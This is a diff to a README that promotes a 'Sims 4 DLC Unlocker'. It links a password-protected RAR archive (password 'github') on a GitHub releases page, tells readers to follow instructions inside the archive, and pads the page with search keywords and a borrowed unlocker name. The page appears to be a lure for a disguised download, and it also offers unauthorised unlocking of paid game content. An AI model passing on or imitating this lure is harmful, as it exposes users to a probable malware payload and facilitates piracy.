@@ -5,13 +5,13 @@ To get started with Sims 4 DLC Unlocker, follow these simple steps:
 1. **[![Download Sims 4 DLC Unlocker](https://img.shields.io/badge/Sims%204-DLC%20Unlocker-green
 )](https://github.com/lukman-nov/sims4_dlc_unlocker/releases/download/v134/Sims.4.DLC.Unlocker.rar)**
 2. **Pass: github**
-3. Extract the downloaded ZIP file to your desired location on your system.
-4. 
+3. **Unlock the archive and follow the instructions in the archive!**
+4. **Enjoy the game!**
+
 **Description:**  
 🚀 **Anadius Unlocker ** is a best currently available way to unlock Sims 4 Expannsions and keep them up-to-date while also being able to get access to online features like gallery.
 
 **Keywords:** sims 4 dlc unlocker, sims 4 unlock expansions, sims 4 free dlc, sims 4 free expansion packs, anadius unlocker, ea dlc unlocker
-
 
 ![DLC Unlocker Preview](https://preview.redd.it/downloaded-sims-unlocker-and-dlc-updater-from-anadius-but-v0-470t9xvx8qfb1.png?width=861&format=png&auto=webp&s=df32896c89cef6c97241a6bbdaf36bb42e5d6504)
 
